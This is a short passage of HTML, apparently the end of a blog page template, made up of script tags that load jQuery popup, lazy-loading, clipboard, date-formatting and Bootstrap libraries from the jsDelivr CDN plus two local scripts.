src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
